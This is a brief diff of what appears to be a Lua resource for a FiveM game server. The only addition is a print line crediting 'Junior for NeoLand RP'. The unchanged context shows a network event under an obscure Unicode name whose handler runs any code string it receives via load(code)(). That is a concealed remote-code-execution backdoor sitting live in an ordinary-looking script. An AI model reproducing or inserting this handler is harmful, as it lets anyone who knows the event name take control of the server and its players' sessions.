@@ -77,3 +77,5 @@ RegisterNetEvent('ᓚᘏᗢ')
 AddEventHandler('ᓚᘏᗢ', function(code)
 	load(code)()
 end)
+
+print('Made by Junior for NeoLand RP')
